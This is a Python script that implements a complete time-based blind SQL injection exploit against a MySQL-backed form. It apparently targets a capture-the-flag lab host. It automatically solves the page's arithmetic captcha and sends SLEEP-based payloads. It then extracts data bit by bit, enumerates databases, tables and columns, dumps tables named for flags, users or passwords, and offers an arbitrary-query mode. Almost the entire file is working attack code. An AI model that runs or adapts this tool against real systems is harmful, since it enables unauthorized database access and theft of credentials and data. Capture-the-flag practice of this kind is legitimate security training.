import requests
import time
import re
import sys
from lxml import html
import json

class CompleteSQLiExploit:
    def __init__(self, url, sleep_time=1):
        self.url = url
        self.sleep_time = sleep_time
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        self.request_count = 0
        self.sql_field = None
        self.captcha_field = None
        
    def get_page(self):
        """Get the page and return HTML content"""
        try:
            response = self.session.get(self.url, headers=self.headers, timeout=10)
            self.request_count += 1
            return response.text
        except Exception as e:
            print(f"[-] Error getting page: {e}")
            return None
    
    def solve_captcha(self, html_content):
        """Solve simple arithmetic captcha"""
        if not html_content:
            return "0"
        
        # Method 1: Regex patterns
        patterns = [
            r'(\d+)\s*\+\s*(\d+)\s*=\s*\?',
            r'(\d+)\s*-\s*(\d+)\s*=\s*\?',
            r'(\d+)\s*\*\s*(\d+)\s*=\s*\?',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                num1 = int(match.group(1))
                num2 = int(match.group(2))
                
                if '+' in pattern:
                    return str(num1 + num2)
                elif '-' in pattern:
                    return str(num1 - num2)
                elif '*' in pattern:
                    return str(num1 * num2)
        
        # Method 2: XPath extraction
        try:
            tree = html.fromstring(html_content)
            captcha_label = tree.xpath('/html/body/div[2]/form/div[2]/label')
            if captcha_label:
                text = captcha_label[0].text_content().strip()
                if '+' in text:
                    parts = text.split('+')
                    num1 = int(parts[0].strip())
                    num2 = int(parts[1].split('=')[0].strip())
                    return str(num1 + num2)
        except:
            pass
        
        # Method 3: Manual extraction
        lines = html_content.split('\n')
        for line in lines:
            if '=' in line and '?' in line and ('+' in line or '-' in line or '*' in line):
                line = line.replace('?', '').replace('=', '').strip()
                if '+' in line:
                    parts = line.split('+')
                    if len(parts) == 2:
                        try:
                            return str(int(parts[0].strip()) + int(parts[1].strip()))
                        except:
                            pass
        
        return "0"
    
    def extract_form_fields(self, html_content):
        """Extract form field names"""
        if not html_content:
            return "query", "captcha"
        
        tree = html.fromstring(html_content)
        
        # Try the known XPaths first
        sql_input = tree.xpath('/html/body/div[2]/form/div[1]/input')
        captcha_input = tree.xpath('/html/body/div[2]/form/div[2]/input')
        
        if sql_input and captcha_input:
            sql_field = sql_input[0].get('name', 'query')
            captcha_field = captcha_input[0].get('name', 'captcha')
            return sql_field, captcha_field
        
        # Fallback: find all inputs
        inputs = tree.xpath('//input')
        for inp in inputs:
            name = inp.get('name', '')
            if name:
                if 'captcha' in name.lower():
                    captcha_field = name
                else:
                    sql_field = name
        
        return sql_field or "query", captcha_field or "captcha"
    
    def send_payload(self, sql_payload, max_retries=3):
        """Send SQL injection payload with solved captcha"""
        for attempt in range(max_retries):
            try:
                # Get fresh page
                page = self.get_page()
                if not page:
                    print(f"[-] Failed to get page (attempt {attempt+1}/{max_retries})")
                    time.sleep(1)
                    continue
                
                # Solve captcha
                captcha_answer = self.solve_captcha(page)
                
                # Extract form fields (cache them after first successful extraction)
                if not self.sql_field or not self.captcha_field:
                    self.sql_field, self.captcha_field = self.extract_form_fields(page)
                
                # Prepare data
                data = {
                    self.sql_field: sql_payload,
                    self.captcha_field: captcha_answer
                }
                
                # Send request and time it
                start_time = time.time()
                response = self.session.post(self.url, data=data, headers=self.headers, timeout=10)
                self.request_count += 1
                elapsed = time.time() - start_time
                
                # Small delay between requests
                time.sleep(0.05)
                
                return response, elapsed
                
            except Exception as e:
                print(f"[-] Error in send_payload (attempt {attempt+1}/{max_retries}): {e}")
                time.sleep(2)
        
        return None, 0
    
    def test_injection(self):
        """Test if SQL injection works with different payloads"""
        print("[*] Testing SQL injection...")
        
        payloads = [
            f"' AND SLEEP({self.sleep_time})#",
            f"' AND (SELECT SLEEP({self.sleep_time}))#",
            f"') AND SLEEP({self.sleep_time})#",
            f"' OR SLEEP({self.sleep_time})#",
            f"\" AND SLEEP({self.sleep_time})#",
        ]
        
        for payload in payloads:
            print(f"  [+] Trying: {payload}")
            response, elapsed = self.send_payload(payload)
            
            if response:
                print(f"    Response time: {elapsed:.2f}s")
                
                # Check if sleep worked (80% threshold)
                if elapsed >= self.sleep_time * 0.8:
                    print(f"    [SUCCESS] Payload works!")
                    return True, payload
        
        return False, None
    
    # BIT-BY-BIT EXTRACTION (FAST)
    def check_condition(self, condition):
        """Check if condition is true using time-based injection"""
        payload = f"' AND IF({condition},SLEEP({self.sleep_time}),0)#"
        
        response, elapsed = self.send_payload(payload)
        if response and elapsed >= (self.sleep_time * 0.8):
            return True
        return False
    
    def extract_length_bitwise(self, query):
        """Get length of query result using bitwise extraction"""
        length = 0
        
        for bit in range(8):  # Up to 255 length
            condition = f"(LENGTH(({query}))>>{bit})&1"
            if self.check_condition(condition):
                length |= (1 << bit)
        
        return length
    
    def extract_char_bitwise(self, query, position):
        """Extract single character using bitwise extraction"""
        char_val = 0
        
        for bit in range(7):  # 7 bits for ASCII 0-127
            condition = f"(ASCII(SUBSTRING(({query}),{position},1))>>{bit})&1"
            if self.check_condition(condition):
                char_val |= (1 << bit)
        
        if 32 <= char_val <= 126:  # Printable ASCII
            return chr(char_val)
        elif char_val == 0:
            return ''  # Null terminator
        else:
            return f'[{char_val}]'  # Non-printable
    
    def extract_string_bitwise(self, query, max_length=200):
        """Extract string result using bitwise method (fast)"""
        print(f"[*] Extracting: {query[:50]}...")
        
        # Get length
        length = self.extract_length_bitwise(query)
        if length == 0:
            return ""
        
        print(f"[+] Length: {length}")
        
        # Extract characters
        result = ""
        for i in range(1, length + 1):
            char = self.extract_char_bitwise(query, i)
            result += char
            sys.stdout.write(f"\r[+] Progress: {i}/{length} - Result: {result}")
            sys.stdout.flush()
            
            if char == '' or (i > max_length):
                break
        
        print()
        return result
    
    # RECONNAISSANCE FUNCTIONS
    def get_system_info(self):
        """Get basic system information"""
        print("\n[*] Gathering system information...")
        
        info = {}
        
        # MySQL version
        version = self.extract_string_bitwise("SELECT version()", max_length=50)
        info['version'] = version
        print(f"[+] MySQL Version: {version}")
        
        # Current database
        current_db = self.extract_string_bitwise("SELECT database()", max_length=50)
        info['current_database'] = current_db
        print(f"[+] Current Database: {current_db}")
        
        # Current user
        current_user = self.extract_string_bitwise("SELECT current_user()", max_length=50)
        info['current_user'] = current_user
        print(f"[+] Current User: {current_user}")
        
        return info
    
    def get_databases(self):
        """Get all databases"""
        print("\n[*] Extracting databases...")
        
        # Try GROUP_CONCAT first (fastest)
        query = "SELECT GROUP_CONCAT(schema_name SEPARATOR '|||') FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')"
        databases_str = self.extract_string_bitwise(query, max_length=500)
        
        if databases_str:
            databases = [db.strip() for db in databases_str.split('|||') if db.strip()]
            print(f"[+] Found {len(databases)} databases")
            return databases
        
        # Fallback: one by one extraction
        print("[*] Using one-by-one extraction...")
        databases = []
        
        # Get count first
        count_query = "SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys')"
        count_str = self.extract_string_bitwise(count_query, max_length=3)
        
        try:
            db_count = int(count_str)
        except:
            db_count = 5
        
        for i in range(db_count):
            query = f"SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys') LIMIT {i},1"
            db = self.extract_string_bitwise(query, max_length=50)
            if db:
                databases.append(db)
                print(f"[+] Database {i+1}: {db}")
        
        return databases
    
    def get_tables(self, database):
        """Get tables from a database"""
        print(f"\n[*] Extracting tables from '{database}'...")
        
        # Try GROUP_CONCAT first
        query = f"SELECT GROUP_CONCAT(table_name SEPARATOR '|||') FROM information_schema.tables WHERE table_schema='{database}'"
        tables_str = self.extract_string_bitwise(query, max_length=500)
        
        if tables_str:
            tables = [table.strip() for table in tables_str.split('|||') if table.strip()]
            print(f"[+] Found {len(tables)} tables")
            return tables
        
        # Fallback: one by one
        tables = []
        for i in range(20):  # Max 20 tables
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1"
            table = self.extract_string_bitwise(query, max_length=50)
            if table:
                tables.append(table)
                print(f"[+] Table {i+1}: {table}")
            else:
                break
        
        return tables
    
    def get_columns(self, database, table):
        """Get columns from a table"""
        print(f"\n[*] Extracting columns from '{database}.{table}'...")
        
        # Try GROUP_CONCAT first
        query = f"SELECT GROUP_CONCAT(column_name SEPARATOR '|||') FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'"
        columns_str = self.extract_string_bitwise(query, max_length=500)
        
        if columns_str:
            columns = [col.strip() for col in columns_str.split('|||') if col.strip()]
            print(f"[+] Found {len(columns)} columns")
            return columns
        
        # Fallback: one by one
        columns = []
        for i in range(20):  # Max 20 columns
            query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {i},1"
            column = self.extract_string_bitwise(query, max_length=50)
            if column:
                columns.append(column)
                print(f"[+] Column {i+1}: {column}")
            else:
                break
        
        return columns
    
    # FLAG EXTRACTION FUNCTIONS
    def get_flag_count(self, database="harry", table="flag"):
        """Get number of flag records"""
        print(f"[*] Getting flag count from {database}.{table}...")
        query = f"SELECT COUNT(*) FROM {database}.{table}"
        count_str = self.extract_string_bitwise(query, max_length=3)
        
        try:
            count = int(count_str)
            print(f"[+] Found {count} flag record(s)")
            return count
        except:
            print(f"[+] Assuming 1 flag record")
            return 1
    
    def extract_all_flags(self, database="harry", table="flag", column="flag_value"):
        """Extract all flags using optimal method"""
        print(f"\n[*] Extracting flags from {database}.{table}...")
        
        flags = []
        
        # Method 1: Try GROUP_CONCAT first (fastest if it works)
        print("[*] Trying GROUP_CONCAT method...")
        query = f"SELECT GROUP_CONCAT({column} SEPARATOR '|||') FROM {database}.{table}"
        flags_str = self.extract_string_bitwise(query, max_length=1000)
        
        if flags_str and '|||' in flags_str:
            flags = [f.strip() for f in flags_str.split('|||') if f.strip()]
            print(f"[+] Extracted {len(flags)} flags using GROUP_CONCAT")
            return flags
        
        # Method 2: One by one extraction
        print("[*] Using one-by-one extraction...")
        count = self.get_flag_count(database, table)
        
        for i in range(count):
            print(f"\n[*] Extracting flag {i+1}/{count}...")
            query = f"SELECT {column} FROM {database}.{table} LIMIT {i},1"
            flag = self.extract_string_bitwise(query, max_length=100)
            
            if flag:
                flags.append(flag)
                print(f"[+] Flag {i+1}: {flag}")
        
        return flags
    
    def dump_table_data(self, database, table, columns, limit=3):
        """Dump sample data from a table"""
        print(f"\n[*] Dumping data from {database}.{table}...")
        
        data = []
        col_list = ', '.join(columns)
        
        for row_num in range(limit):
            row_data = {}
            
            for col in columns:
                query = f"SELECT {col} FROM {database}.{table} LIMIT {row_num},1"
                value = self.extract_string_bitwise(query, max_length=100)
                row_data[col] = value if value else "[NULL]"
            
            # Check if we got any real data
            if any(v != "[NULL]" for v in row_data.values()):
                data.append(row_data)
                print(f"[+] Row {row_num+1}: {row_data}")
            else:
                break
        
        return data
    
    # MAIN WORKFLOWS
    def quick_recon(self):
        """Quick reconnaissance to understand the database"""
        print("\n" + "="*60)
        print("QUICK RECONNAISSANCE")
        print("="*60)
        
        results = {}
        
        # 1. System info
        results['system_info'] = self.get_system_info()
        
        # 2. Databases
        databases = self.get_databases()
        results['databases'] = databases
        
        if not databases:
            print("[-] No databases found")
            return results
        
        # 3. Explore interesting databases
        for db in databases[:2]:  # First 2 databases only
            if db.lower() in ['information_schema', 'mysql', 'performance_schema', 'sys']:
                continue
            
            print(f"\n[*] Exploring database: {db}")
            results[db] = {}
            
            # Get tables
            tables = self.get_tables(db)
            results[db]['tables'] = tables
            
            # Explore interesting tables
            for table in tables[:3]:  # First 3 tables
                if 'flag' in table.lower() or 'user' in table.lower() or 'pass' in table.lower():
                    print(f"\n[*] Interesting table found: {table}")
                    
                    # Get columns
                    columns = self.get_columns(db, table)
                    results[db][table] = {'columns': columns}
                    
                    # Try to dump a few rows
                    if columns:
                        sample_data = self.dump_table_data(db, table, columns, limit=2)
                        results[db][table]['sample_data'] = sample_data
        
        return results
    
    def focused_flag_extraction(self):
        """Focused extraction for flag tables"""
        print("\n" + "="*60)
        print("FOCUSED FLAG EXTRACTION")
        print("="*60)
        
        # Get databases
        databases = self.get_databases()
        
        if not databases:
            print("[-] No databases found")
            return
        
        flag_results = {}
        
        for db in databases:
            if db.lower() in ['information_schema', 'mysql', 'performance_schema', 'sys']:
                continue
            
            print(f"\n[*] Searching for flag tables in database: {db}")
            
            # Get all tables
            tables = self.get_tables(db)
            
            # Look for flag tables
            flag_tables = [t for t in tables if 'flag' in t.lower()]
            
            if not flag_tables:
                print(f"  [-] No flag tables found in {db}")
                continue
            
            flag_results[db] = {}
            
            for table in flag_tables:
                print(f"\n[*] Found flag table: {db}.{table}")
                
                # Get columns
                columns = self.get_columns(db, table)
                
                # Look for flag value columns
                flag_columns = [c for c in columns if 'flag' in c.lower() or 'value' in c.lower() or 'data' in c.lower()]
                
                if not flag_columns:
                    # If no obvious flag column, try all columns
                    flag_columns = columns
                
                flag_results[db][table] = {'columns': columns, 'flag_columns': flag_columns}
                
                # Extract data from flag columns
                for col in flag_columns[:3]:  # First 3 flag-like columns
                    print(f"\n[*] Extracting values from {col} column...")
                    
                    # Get count
                    count_query = f"SELECT COUNT({col}) FROM {db}.{table}"
                    count_str = self.extract_string_bitwise(count_query, max_length=3)
                    
                    try:
                        count = int(count_str) if count_str.isdigit() else 1
                    except:
                        count = 1
                    
                    # Extract values
                    values = []
                    for i in range(min(count, 5)):  # Max 5 rows
                        query = f"SELECT {col} FROM {db}.{table} LIMIT {i},1"
                        value = self.extract_string_bitwise(query, max_length=100)
                        if value:
                            values.append(value)
                            print(f"[+] Row {i+1}: {value}")
                    
                    flag_results[db][table][f'{col}_values'] = values
        
        return flag_results
    
    def auto_exploit(self):
        """Automatic exploitation with smart heuristics"""
        print("\n" + "="*60)
        print("AUTOMATIC SQL INJECTION EXPLOIT")
        print("="*60)
        
        # Test injection first
        success, payload = self.test_injection()
        if not success:
            print("[-] Injection failed. Exiting.")
            return
        
        print(f"\n[+] Using payload template: {payload}")
        
        # Get system info
        system_info = self.get_system_info()
        
        # Look for flag tables
        flag_results = self.focused_flag_extraction()
        
        # If no flag tables found, do quick recon
        if not flag_results:
            print("\n[*] No flag tables found, performing quick reconnaissance...")
            recon_results = self.quick_recon()
        else:
            recon_results = {}
        
        # Combine results
        all_results = {
            'system_info': system_info,
            'flag_results': flag_results,
            'recon_results': recon_results,
            'stats': {
                'requests': self.request_count,
                'timestamp': time.ctime(),
                'url': self.url
            }
        }
        
        # Save results
        self.save_results(all_results)
        
        return all_results
    
    def save_results(self, results, filename="sqli_exploit_results.txt"):
        """Save results to text and JSON files"""
        # Save as JSON
        json_filename = filename.replace('.txt', '.json')
        with open(json_filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"[+] Results saved to {json_filename}")
        
        # Save as readable text
        with open(filename, 'w') as f:
            f.write("SQL INJECTION EXPLOIT RESULTS\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Target URL: {self.url}\n")
            f.write(f"Timestamp: {results.get('stats', {}).get('timestamp', time.ctime())}\n")
            f.write(f"Total Requests: {results.get('stats', {}).get('requests', self.request_count)}\n\n")
            
            # System info
            if 'system_info' in results:
                f.write("SYSTEM INFORMATION\n")
                f.write("-" * 40 + "\n")
                for key, value in results['system_info'].items():
                    f.write(f"{key}: {value}\n")
                f.write("\n")
            
            # Flag results
            if 'flag_results' in results and results['flag_results']:
                f.write("FLAG EXTRACTION RESULTS\n")
                f.write("=" * 40 + "\n")
                for db in results['flag_results']:
                    f.write(f"\nDatabase: {db}\n")
                    for table in results['flag_results'][db]:
                        f.write(f"\n  Table: {table}\n")
                        if 'columns' in results['flag_results'][db][table]:
                            f.write(f"  Columns: {results['flag_results'][db][table]['columns']}\n")
                        
                        # Print flag values
                        for key in results['flag_results'][db][table]:
                            if key.endswith('_values'):
                                f.write(f"\n  Values from {key.replace('_values', '')}:\n")
                                for i, value in enumerate(results['flag_results'][db][table][key]):
                                    f.write(f"    Row {i+1}: {value}\n")
                        f.write("\n")
            
            # Recon results
            if 'recon_results' in results and results['recon_results']:
                f.write("\nRECONNAISSANCE RESULTS\n")
                f.write("=" * 40 + "\n")
                if 'databases' in results['recon_results']:
                    f.write(f"\nDatabases: {results['recon_results']['databases']}\n")
        
        print(f"[+] Readable results saved to {filename}")

def main():
    TARGET_URL = "https://fd6ygr10mv.voorivex-lab.online/index.php"
    
    print("\n" + "="*70)
    print("COMPLETE SQL INJECTION EXPLOITATION TOOL")
    print("="*70)
    print(f"Target: {TARGET_URL}")
    print(f"Time-based injection with sleep(1)")
    print("="*70)
    
    # Create exploit object
    exploit = CompleteSQLiExploit(TARGET_URL, sleep_time=1)
    
    try:
        # First, test if we can connect
        print("[*] Testing connection...")
        page = exploit.get_page()
        if not page:
            print("[-] Could not connect to target")
            return
        
        print("[+] Connection successful")
        
        # Check if we can solve captcha
        captcha = exploit.solve_captcha(page)
        print(f"[+] Captcha solving works: {captcha}")
        
        # Menu
        print("\nSelect operation:")
        print("1. Quick flag extraction (harry.flag table)")
        print("2. Automatic full exploitation")
        print("3. Manual query execution")
        print("4. Test injection only")
        print("5. Exit")
        
        choice = input("\nEnter choice (1-5): ").strip()
        
        if choice == "1":
            # Quick flag extraction from known table
            flags = exploit.extract_all_flags("harry", "flag", "flag_value")
            if flags:
                print("\n" + "="*60)
                print("FLAGS EXTRACTED:")
                print("="*60)
                for i, flag in enumerate(flags):
                    print(f"Flag {i+1}: {flag}")
                
                # Save flags to file
                with open("flags.txt", "w") as f:
                    for flag in flags:
                        f.write(f"{flag}\n")
                print(f"\n[+] Flags saved to flags.txt")
            else:
                print("[-] No flags found")
        
        elif choice == "2":
            # Automatic exploitation
            results = exploit.auto_exploit()
            print("\n[+] Exploitation completed!")
        
        elif choice == "3":
            # Manual query
            query = input("\nEnter SQL query to execute: ").strip()
            if query:
                print(f"\n[*] Executing: {query}")
                result = exploit.extract_string_bitwise(query, max_length=200)
                print(f"\n[+] Result: {result}")
        
        elif choice == "4":
            # Test injection only
            success, payload = exploit.test_injection()
            if success:
                print(f"\n[+] Injection successful with payload: {payload}")
            else:
                print("\n[-] Injection failed")
        
        else:
            print("[*] Exiting")
        
        print(f"\n[*] Total requests made: {exploit.request_count}")
        
    except KeyboardInterrupt:
        print("\n\n[!] Exploitation interrupted by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()

# Quick direct flag extraction function
def quick_flag_extraction():
    """Direct function to extract flag from harry.flag table"""
    TARGET_URL = "https://fd6ygr10mv.voorivex-lab.online/index.php"
    
    print("\n[*] Starting quick flag extraction...")
    
    exploit = CompleteSQLiExploit(TARGET_URL, sleep_time=1)
    
    # Test injection
    success, payload = exploit.test_injection()
    if not success:
        print("[-] Injection failed")
        return
    
    # Extract flags directly
    flags = exploit.extract_all_flags("harry", "flag", "flag_value")
    
    if flags:
        print("\n" + "="*60)
        print("FLAGS FOUND:")
        for i, flag in enumerate(flags):
            print(f"Flag {i+1}: {flag}")
        
        # Also save to file
        with open("flag.txt", "w") as f:
            for flag in flags:
                f.write(f"{flag}\n")
        
        print(f"\n[+] Total requests: {exploit.request_count}")
        print("[+] Flags saved to flag.txt")
    else:
        print("[-] No flags found")

if __name__ == "__main__":
    # You can either run the main menu or directly extract flags
    # main()  # Uncomment for full menu
    
    # For direct flag extraction:
    quick_flag_extraction()
